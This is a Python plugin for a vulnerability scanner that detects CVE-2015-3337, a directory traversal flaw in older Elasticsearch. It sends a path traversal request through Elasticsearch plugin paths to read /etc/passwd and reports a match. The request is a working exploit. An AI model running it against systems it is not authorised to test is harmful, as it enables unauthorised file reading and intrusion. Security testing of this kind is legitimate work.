#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if service.lower() != 'wap-wsp' and port not in [9200]:
        return

    base_url = '%s://%s:%s' % (service, ip, port)
    plugin_list = ['test', 'kopf', 'HQ', 'marvel', 'bigdesk', 'head']
    try:
        result = ''
        for plugin in plugin_list:

            r = await http_client(ip, port).get(base_url + '/_plugin/%s/' % plugin, timeout=20)

            if r.status_code == 200:
                url = "/_plugin/%s/../../../../../../etc/passwd" % plugin
                payload = "GET {} HTTP/1.1\r\n" + \
                          "Host: {}\r\n".format(ip) + \
                          "User-Agent: {}\r\n".format(GLOBAL_USER_AGENT) + \
                          "Connection: close\r\n\r\n"

                reader, writer = await asyncio.open_connection(ip, port)
                writer.write(payload.format(url).encode())
                await writer.drain()
                data = await asyncio.wait_for(reader.read(500), 5)
                writer.close()
                try:
                    await writer.wait_closed()  # application data after close notify (_ssl.c:2730)
                except Exception as e:
                    pass

                if b'root:x:0:0' in data:
                    result += 'CVE-2015-3337: %s \n\n\n %s' % (url, data) + '\n\n'
        if result:
            ret = {
                'alert_group': 'CVE-2015-3337 ES Directory Traversal',
                'affects': '%s://%s:%s' % (service, ip, port),
                'details': u"ES低版本存在目录穿越漏洞，可通过HTTP请求获取系统任意文件，"
                           u"造成信息泄露并进一步导致入侵事件的发生" + "\n\n" + result
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9200, 'http', True, task_msg={})
    run_plugin_test(scan)
